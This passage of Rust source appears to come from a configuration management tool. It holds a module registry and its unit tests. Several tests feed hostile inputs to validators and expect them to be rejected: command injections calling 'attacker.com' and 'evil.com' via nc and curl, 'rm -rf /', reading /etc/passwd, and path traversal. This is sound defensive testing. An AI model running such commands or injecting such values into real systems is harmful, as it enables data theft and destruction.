        registry.register(Arc::new(set_fact::SetFactModule));
        registry.register(Arc::new(stat::StatModule));

        registry.register(Arc::new(facts::FactsModule));

        // Raw command and script modules
        registry.register(Arc::new(raw::RawModule));
        registry.register(Arc::new(script::ScriptModule));
        registry.register(Arc::new(synchronize::SynchronizeModule));

        // Network device configuration modules
        network::register_network_modules(&mut registry);

        registry
    }

    /// Register a module
    pub fn register(&mut self, module: Arc<dyn Module>) {
        self.modules.insert(module.name().to_string(), module);
    }

    /// Get a module by name
    pub fn get(&self, name: &str) -> Option<Arc<dyn Module>> {
        self.modules.get(name).cloned()
    }

    /// Check if a module exists
    pub fn contains(&self, name: &str) -> bool {
        self.modules.contains_key(name)
    }

    /// Get all module names
    pub fn names(&self) -> Vec<&str> {
        self.modules.keys().map(|s| s.as_str()).collect()
    }

    /// Execute a module by name
    pub fn execute(
        &self,
        name: &str,
        params: &ModuleParams,
        context: &ModuleContext,
    ) -> ModuleResult<ModuleOutput> {
        let module = self
            .get(name)
            .ok_or_else(|| ModuleError::NotFound(name.to_string()))?;

        // Validate parameters first
        module.validate_params(params)?;

        // Check required parameters
        for param in module.required_params() {
            if !params.contains_key(*param) {
                return Err(ModuleError::MissingParameter((*param).to_string()));
            }
        }

        // Execute based on mode
        if context.check_mode {
            module.check(params, context)
        } else {
            module.execute(params, context)
        }
    }
}

impl Default for ModuleRegistry {
    fn default() -> Self {
        Self::with_builtins()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    struct TestModule;

    impl Module for TestModule {
        fn name(&self) -> &'static str {
            "test"
        }

        fn description(&self) -> &'static str {
            "A test module"
        }

        fn execute(
            &self,
            params: &ModuleParams,
            context: &ModuleContext,
        ) -> ModuleResult<ModuleOutput> {
            if context.check_mode {
                return Ok(ModuleOutput::ok("Would do something"));
            }

            let msg = params
                .get_string("msg")?
                .unwrap_or_else(|| "Hello".to_string());
            Ok(ModuleOutput::changed(msg))
        }

        fn required_params(&self) -> &[&'static str] {
            &[]
        }
    }

    #[test]
    fn test_module_registry() {
        let mut registry = ModuleRegistry::new();
        registry.register(Arc::new(TestModule));

        assert!(registry.contains("test"));
        assert!(!registry.contains("nonexistent"));

        let module = registry.get("test").unwrap();
        assert_eq!(module.name(), "test");
    }

    #[test]
    fn test_module_output() {
        let output = ModuleOutput::changed("Something changed")
            .with_data("key", serde_json::json!("value"))
            .with_diff(Diff::new("old", "new"));

        assert!(output.changed);
        assert_eq!(output.status, ModuleStatus::Changed);
        assert!(output.diff.is_some());
        assert!(output.data.contains_key("key"));
    }

    #[test]
    fn test_param_ext() {
        let mut params: ModuleParams = HashMap::new();
        params.insert("string".to_string(), serde_json::json!("hello"));
        params.insert("bool_true".to_string(), serde_json::json!(true));
        params.insert("bool_str".to_string(), serde_json::json!("yes"));
        params.insert("number".to_string(), serde_json::json!(42));
        params.insert(
            "array".to_string(),
            serde_json::json!(["one", "two", "three"]),
        );

        assert_eq!(
            params.get_string("string").unwrap(),
            Some("hello".to_string())
        );
        assert_eq!(params.get_bool("bool_true").unwrap(), Some(true));
        assert_eq!(params.get_bool("bool_str").unwrap(), Some(true));
        assert_eq!(params.get_i64("number").unwrap(), Some(42));
        assert_eq!(
            params.get_vec_string("array").unwrap(),
            Some(vec![
                "one".to_string(),
                "two".to_string(),
                "three".to_string()
            ])
        );
    }

    #[test]
    fn test_validate_package_name_valid() {
        // Simple alphanumeric names
        assert!(validate_package_name("nginx").is_ok());
        assert!(validate_package_name("python3").is_ok());
        assert!(validate_package_name("vim").is_ok());

        // Names with dots
        assert!(validate_package_name("python3.11").is_ok());
        assert!(validate_package_name("libfoo.so").is_ok());

        // Names with underscores
        assert!(validate_package_name("python_dev").is_ok());
        assert!(validate_package_name("lib_ssl_dev").is_ok());

        // Names with hyphens
        assert!(validate_package_name("lib-dev").is_ok());
        assert!(validate_package_name("build-essential").is_ok());

        // Names with plus signs
        assert!(validate_package_name("g++").is_ok());
        assert!(validate_package_name("c++").is_ok());
        assert!(validate_package_name("libstdc++").is_ok());

        // Complex combinations
        assert!(validate_package_name("libssl1.1-dev").is_ok());
        assert!(validate_package_name("python3.11-venv").is_ok());
        assert!(validate_package_name("libboost1.74-dev").is_ok());
    }

    #[test]
    fn test_validate_package_name_invalid() {
        // Empty name
        assert!(validate_package_name("").is_err());

        // Command injection attempts
        assert!(validate_package_name("pkg$(whoami)").is_err());
        assert!(validate_package_name("pkg`id`").is_err());
        assert!(validate_package_name("pkg|nc attacker.com").is_err());
        assert!(validate_package_name("pkg&&reboot").is_err());
        assert!(validate_package_name("pkg||curl evil.com").is_err());
        assert!(validate_package_name("pkg\\`rm\\ -rf\\ /").is_err());

        // Other invalid characters
        assert!(validate_package_name("pkg name").is_err()); // space
        assert!(validate_package_name("pkg\tname").is_err()); // tab
        assert!(validate_package_name("pkg\nname").is_err()); // newline
        assert!(validate_package_name("pkg/name").is_err()); // slash
        assert!(validate_package_name("pkg\\name").is_err()); // backslash
        assert!(validate_package_name("pkg'name").is_err()); // single quote
        assert!(validate_package_name("pkg\"name").is_err()); // double quote
        assert!(validate_package_name("pkg>file").is_err()); // redirect
        assert!(validate_package_name("pkg<file").is_err()); // redirect
    }

    #[test]
    fn test_validate_shell_safe_string_rejects_injection() {
        assert!(validate_shell_safe_string("pkg$(whoami)", "Package name").is_err());
        assert!(validate_shell_safe_string("pkg`reboot`", "Package name").is_err());
        assert!(validate_shell_safe_string("pkg||curl evil.com", "Package name").is_err());
        assert!(validate_shell_safe_string("pkg&&rm -rf /", "Package name").is_err());
    }

    #[test]
    fn test_validate_shell_safe_string_accepts_valid() {
        assert!(validate_shell_safe_string("nginx", "Package name").is_ok());
        assert!(validate_shell_safe_string("python3.11", "Package name").is_ok());
        assert!(validate_shell_safe_string("lib-dev", "Package name").is_ok());
        assert!(validate_shell_safe_string("g++", "Package name").is_ok());
    }

    #[test]
    fn test_validate_command_args() {
        assert!(validate_command_args("nginx -c /etc/nginx.conf").is_ok());
        assert!(validate_command_args("--force").is_ok());
        assert!(validate_command_args("").is_ok()); // Empty is fine
    }

    #[test]
    fn test_validate_command_args_rejects_dangerous() {
        assert!(validate_command_args("$(cat /etc/passwd)").is_err());
        assert!(validate_command_args("nginx; reboot").is_err());
        assert!(validate_command_args("pkg && reboot").is_err());
        assert!(validate_command_args("cmd || curl evil.com").is_err());
    }

    #[test]
    fn test_normalize_path() {
        // Simple relative path
        assert!(normalize_path("./file.txt", None).is_ok());

        // Path with dots
        assert!(normalize_path("../parent", None).is_ok());

        // Absolute path
        assert!(normalize_path("/etc/passwd", None).is_ok());
    }

    #[test]
    fn test_normalize_path_with_base_dir() {
        let base = PathBuf::from("/safe/dir");

        // Path within base directory
        assert!(normalize_path("/safe/dir/file.txt", Some(&base)).is_ok());

        // Path that tries to escape base directory
        assert!(normalize_path("/etc/passwd", Some(&base)).is_err());

        // Parent directory traversal
        assert!(normalize_path("../../etc/passwd", Some(&base)).is_err());
    }

    #[test]
    fn test_validate_path_param_rejects_traversal() {
        assert!(validate_path_param("../../../etc/passwd", "creates").is_err());
        assert!(validate_path_param("./../../tmp", "removes").is_err());
        assert!(validate_path_param("/var/log/../root", "creates").is_err());
        assert!(validate_path_param("..", "creates").is_err());
    }

    #[test]
    fn test_validate_path_param_allows_relative() {
        assert!(validate_path_param("./tmp/marker.txt", "creates").is_ok());
        assert!(validate_path_param("subdir/file", "removes").is_ok());
        assert!(validate_path_param("marker.txt", "creates").is_ok());
    }

    #[test]
    fn test_validate_path_param_rejects_invalid() {
        // Null bytes
        assert!(validate_path_param("/path\0null", "creates").is_err());

        // Empty path
        assert!(validate_path_param("", "creates").is_err());

        // Newlines
        assert!(validate_path_param("/path\ninjection", "creates").is_err());
        assert!(validate_path_param("/path\rfake", "removes").is_err());
    }

    #[test]
    fn test_module_output_to_result_json_basic() {
        let output = ModuleOutput::changed("Task completed");

        let json = output.to_result_json();

        assert_eq!(json["changed"], true);
        assert_eq!(json["failed"], false);
        assert_eq!(json["skipped"], false);
        assert_eq!(json["msg"], "Task completed");
    }

    #[test]
    fn test_module_output_to_result_json_with_command_output() {
        let mut output = ModuleOutput::ok("Command executed");
        output.rc = Some(0);
        output.stdout = Some("Hello, World!".to_string());
        output.stderr = Some("warning message".to_string());

        let json = output.to_result_json();

        assert_eq!(json["rc"], 0);
        assert_eq!(json["stdout"], "Hello, World!");
        assert_eq!(json["stderr"], "warning message");
        assert_eq!(json["stdout_lines"], serde_json::json!(["Hello, World!"]));
        assert_eq!(json["stderr_lines"], serde_json::json!(["warning message"]));
    }

    #[test]
    fn test_module_output_to_result_json_multiline() {
        let mut output = ModuleOutput::ok("Command executed");
        output.stdout = Some("line1\nline2\nline3".to_string());

        let json = output.to_result_json();

        assert_eq!(
            json["stdout_lines"],
            serde_json::json!(["line1", "line2", "line3"])
        );
    }

    #[test]
    fn test_module_output_to_result_json_with_custom_data() {
        let output = ModuleOutput::changed("File created")
            .with_data("path", serde_json::json!("/tmp/file.txt"))
            .with_data("size", serde_json::json!(1024))
            .with_data("owner", serde_json::json!("root"));

        let json = output.to_result_json();

        assert_eq!(json["path"], "/tmp/file.txt");
        assert_eq!(json["size"], 1024);
        assert_eq!(json["owner"], "root");
    }

    #[test]
    fn test_module_output_to_result_json_failed() {
        let output = ModuleOutput::failed("Command not found");

        let json = output.to_result_json();

        assert_eq!(json["changed"], false);
        assert_eq!(json["failed"], true);
        assert_eq!(json["skipped"], false);
        assert_eq!(json["msg"], "Command not found");
    }

    #[test]
    fn test_module_output_to_result_json_skipped() {
        let output = ModuleOutput::skipped("Skipped in check mode");

        let json = output.to_result_json();

        assert_eq!(json["changed"], false);
        assert_eq!(json["failed"], false);
        assert_eq!(json["skipped"], true);
    }
}
